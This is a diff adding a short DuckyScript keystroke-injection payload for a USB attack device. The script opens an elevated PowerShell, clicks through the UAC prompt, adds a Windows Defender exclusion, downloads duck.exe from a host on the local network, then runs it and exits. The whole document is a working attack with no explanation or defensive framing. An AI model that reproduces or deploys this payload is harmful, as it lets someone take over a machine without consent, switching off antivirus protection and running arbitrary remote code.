@@ -1,0 +1,34 @@
+DELAY 300
+GUI r
+DELAY 50
+STRING powershell
+DELAY 50
+ENTER
+DELAY 200
+STRING Start-Process powershell -Verb runAs
+DELAY 50
+ENTER
+DELAY 200
+LEFTARROW
+DELAY 100
+ENTER
+DELAY 200
+STRING Set-MpPreference -ExclusionPath:{C:\Windows\duck.exe}
+DELAY 50
+ENTER
+STRING Invoke-WebRequest http://192.168.0.60/duck.exe -Outfile C:\Windows\duck.exe
+DELAY 50
+ENTER
+DELAY 300
+STRING start-process C:\Windows\duck.exe
+DELAY 50
+ENTER
+DELAY 50
+ENTER
+STRING EXIT
+DELAY 50
+ENTER
+DELAY 150
+STRING EXIT
+DELAY 50
+ENTER
